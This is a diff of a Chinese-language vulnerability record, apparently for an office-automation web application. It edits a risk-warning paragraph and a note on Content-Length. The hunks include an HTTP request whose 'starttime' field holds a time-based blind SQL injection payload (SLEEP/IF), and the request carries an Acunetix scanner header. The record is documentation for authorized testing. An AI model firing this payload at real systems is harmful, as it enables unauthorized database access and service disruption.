@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -74,6 +74,7 @@ Connection: keep-alive
 Host: 192.168.43.169
 Pragma: no-cache
 X-Requested-With: XMLHttpRequest
+Content-Length: 154
 X-WVS-ID: Acunetix-Autologin/65535
 Cache-Control: no-cache
 Accept: */*
@@ -84,7 +85,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&endtime=1598918400&view=month&condition=1
 ```
 
-> 请求长度说明：原资料 Content-Length 为 154；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ```http
 GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=×tamp=1598069133&total= HTTP/1.1
